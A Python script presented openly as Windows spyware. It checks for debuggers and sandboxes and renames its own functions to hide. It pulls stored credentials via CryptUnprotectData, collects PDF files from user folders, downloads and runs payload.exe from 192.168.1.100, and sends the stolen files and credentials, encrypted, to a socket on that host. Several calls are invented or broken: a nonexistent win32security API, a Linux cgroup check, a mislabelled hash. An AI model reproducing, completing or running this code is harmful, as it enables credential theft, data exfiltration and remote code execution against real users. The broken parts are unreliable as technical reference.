import os
import sys
import socket
import time
import random
import requests
import win32api
import win32con
import win32gui
import win32process
import base64
import hashlib
import random
import struct
import zlib
import subprocess
import urllib.request
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from win32crypt import CryptUnprotectData
import win32security

def check_debugger():
    try:
        win32process.GetPriorityClass(win32process.GetCurrentProcess())
    except:
        return True

def obfuscate_code():
    import random
    import inspect
    import types
    import importlib

    for name, obj in inspect.getmembers(sys.modules[__name__]):
        if isinstance(obj, types.FunctionType) or isinstance(obj, types.MethodType):
            new_name = '_{}'.format(''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=10)))
            globals()[new_name] = globals().pop(name)
            setattr(sys.modules[__name__], new_name, obj)

    for name, mod in sys.modules.items():
        if mod is socket:
            importlib.reload(mod)
            mod.__name__ = '_{}'.format(''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=10)))
            globals()[mod.__name__] = mod
        elif mod is requests:
            importlib.reload(mod)
            mod.__name__ = '_{}'.format(''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=10)))
            globals()[mod.__name__] = mod
        elif mod is urllib.request:
            importlib.reload(mod)
            mod.__name__ = '_{}'.format(''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=10)))
            globals()[mod.__name__] = mod

def anti_sandbox():
    if any(x in os.getenv('PATH') for x in ('VBOX', 'VirtualBox', 'WinXP', 'Windows XP')):
        sys.exit()

    if os.path.exists('C:\\ProgramData\\Microsoft\\Windows\\Templates\\sandbox'):
        sys.exit()

    try:
        cpuid_data = open(os.path.join(os.environ['SystemRoot'], 'system32', 'cpuid.exe'), 'rb').read()
        cpuid_hash = hashlib.sha256(cpuid_data).hexdigest()
        if cpuid_hash == 'e5d274c8e586abd1d2c8cb76385d25748e5eabd1':
            sys.exit()
    except:
        pass

    if 'docker' in os.listdir('/proc/self/cgroup'):
        sys.exit()

def steal_credentials():
    stored_credentials = {}

    for user in win32security.LogonUserCollection(win32security.LogonUserEx2Flags(0), None, None, win32security.LogonUserEx2Flags.NewCredentials):
        credential_blob = user.Credentials().CredentialBlob
        credentials_data = base64.b64encode(credential_blob).decode()
        credentials_hash = hashlib.sha256(credentials_data.encode()).hexdigest()
        decrypted_credentials = CryptUnprotectData(credential_blob, None, None, None, 0)[1]
        try:
            decrypted_credentials = decrypted_credentials.decode('utf-16le')
        except:
            continue
        stored_credentials[credentials_hash] = decrypted_credentials

    return stored_credentials

def steal_files(path, extension=None):
    files_to_send = []

    for root, dirs, files in os.walk(path):
        for file in files:
            if not extension or file.endswith(extension):
                file_path = os.path.join(root, file)
                files_to_send.append((file_path, os.path.getsize(file_path)))

    return files_to_send

def send_stolen_data(data, key):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.100', 12345))
    s.sendall(struct.pack('<Q', len(ciphertext)) + ciphertext + struct.pack('<Q', len(tag)) + tag)
    s.close()

def download_and_run_payload(url, filepath):
    urllib.request.urlretrieve(url, filepath)
    subprocess.Popen(filepath)

def spyware_main():
    if check_debugger():
        sys.exit()

    obfuscate_code()
    anti_sandbox()

    credentials = steal_credentials()
    files = steal_files('C:\\Users', '.pdf')

    download_and_run_payload('http://192.168.1.100/payload.exe', 'C:\\Windows\\Temp\\payload.exe')

    key = b'0123456789012345'  # Llave AES de 128 bits
    for file_path, file_size in files:
        with open(file_path, 'rb') as f:
            data = f.read()
            send_stolen_data(data, key)

    for credential in credentials.items():
        credential_data = f'{credential[0]}:{credential[1]}'
        send_stolen_data(credential_data.encode(), key)

if __name__ == '__main__':
    spyware_main()
